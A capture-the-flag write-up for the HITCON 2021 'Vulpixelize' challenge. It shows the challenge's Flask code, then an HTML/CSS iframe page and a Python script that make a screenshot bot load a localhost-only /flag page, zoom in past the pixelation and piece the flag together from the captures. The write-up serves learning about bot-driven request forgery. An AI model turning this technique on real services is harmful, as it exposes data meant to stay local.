# HITCON 2021 - Vulpixelize (232 points)

My solution for this challenge is maybe unintended and not very technical, but it works :)

---

We can send a URL that the bot will visit.  
It then takes a screenshot of the page, blurs it and returns us the result :  

![vulpixelize](img/vulpixelize.png)  

```py
@app.route('/submit', methods=['GET'])
def submit():
    path = 'static/images/%s.png' % uuid.uuid4().hex
    url  = request.args.get('url')
    if url:
        # secrity check
        if not url.startswith('http://') and not url.startswith('https://'):
            return message(msg='malformed url')

        # access url
        try:
            driver.get(url)
            data = driver.get_screenshot_as_png()
        except common.exceptions.WebDriverException as e:
            return message(msg=str(e))

        # save result
        img = Image.open(io.BytesIO(data))
        img = img.resize((64,64), resample=Image.BILINEAR)
        img = img.resize((1920,1080), Image.NEAREST)
        img.save(path)

        return message(msg=path)
    else:
        return message(msg="url not found :(")
```
  
There is a special endpoint at `/flag` that displays the flag only if we come from `127.0.0.1`, so only the bot can view the flag :  
```py
@app.route('/flag')
def flag():
    print(request.remote_addr)
    if request.remote_addr == '127.0.0.1':
        return message(FLAG)
    return message("allow only from local")
```
  
The idea is to redirect the bot to a page we control that contains an iframe which refers to the `/flag` endpoint, and zooms on parts of the flag to have large enough characters to bypass the blur.  
  
I used a combo of `div` with an `iframe` embedded in it to get only a part of the flag, and `transform`, `left`, `top` CSS properties to zoom on these parts.  
Here is the jinja template that does that :  
```html
<!DOCTYPE html>
<html>
    <head>
        <style>
#outerdiv {
    width: 1800px;
    height: 1000px;
    overflow: hidden;
    position: relative;
}

#inneriframe {
    position: absolute;
    width: 100px;
    height: 100px;
    zoom: 20;
    -moz-transform: scale(20);
    -moz-transform-origin: 0 0;
    -webkit-transform: scale(20);
    -webkit-transform-origin: 0 0;
    border: none;
    left: -{{idx}}px;
    top: -320px;
}
        </style>
    </head>
    <body>
        <div id="outerdiv">
            <iframe src="http://127.0.0.1:8000/flag#msg" id="inneriframe" scrolling=yes></iframe>
        </div>
    </body>
</html>
```
  
Each picture looks like this :  
![first part of flag](img/00.png)  
  
The python script that automates the process (increment the `left` in the template and save the screenshot) :  
```py
from jinja2 import Template
from bs4 import BeautifulSoup

import requests
import os

HOST = "http://3.113.172.41:26478/"
# HOST = "http://0.0.0.0:8000/"

html = Template(open("./index.html.jinja2").read())

for idx in range(13):
    with open("./index.html", "w") as f:
        f.write(html.render(idx=450+90*idx))

    r = requests.get(HOST + "/submit?url=http%3A%2F%2FMON-IP%3AMON-PORT%2F")
    soup = BeautifulSoup(r.text, "html.parser")

    img = requests.get(HOST + soup.find(id="msg").a["href"])
    with open("img/{:02d}.png".format(idx), "wb") as f:
        f.write(img.content)

    print(idx)

os.system("bash -c 'convert img/{00..06}.png +append img/flag-0.png'")
os.system("bash -c 'convert img/{07..12}.png +append img/flag-1.png'")
```
  
The last two lines assemble all the images in 2 images that contains the flag :  
![flag 0](img/flag-0.png)  
![flag 1](img/flag-1.png)  
  
FLAG : `hitcon{1-1-4-1-6-1-e-9-f-9-4-c-7-3-e-4-9-7-a-7-5-d-4-6-6-c-6-3-3-7-f-4}`
